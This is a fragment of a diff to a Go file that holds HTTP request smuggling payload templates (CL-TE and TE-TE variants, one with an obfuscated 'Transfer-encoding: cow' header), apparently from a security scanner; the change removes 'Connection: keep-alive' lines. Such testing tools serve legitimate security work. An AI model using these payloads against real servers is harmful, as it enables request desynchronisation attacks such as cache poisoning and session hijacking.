@@ -24,7 +24,6 @@ Foo: x
 //  2 CL-TE-TE HTTP request smuggling, obfuscating the TE header
 var ClTePayload = []string{`POST %s HTTP/1.1
 Host: %s
-Connection: keep-alive
 Content-Type: application/x-www-form-urlencoded%s
 Content-Length: 6
 Transfer-Encoding: chunked
@@ -35,7 +34,6 @@ G`, `POST %s HTTP/1.1
 Host: %s
 Content-Type: application/x-www-form-urlencoded%s
 Content-length: 4
-Connection: Keep-Alive
 Transfer-Encoding: chunked
 Transfer-encoding: cow
 
@@ -50,7 +48,6 @@ x=1
 `, `POST %s HTTP/1.1
 Host: %s
 Content-Type: application/x-www-form-urlencoded%s
-Connection: Keep-Alive
 Content-Length: 62
 Transfer-Encoding: chunked
 
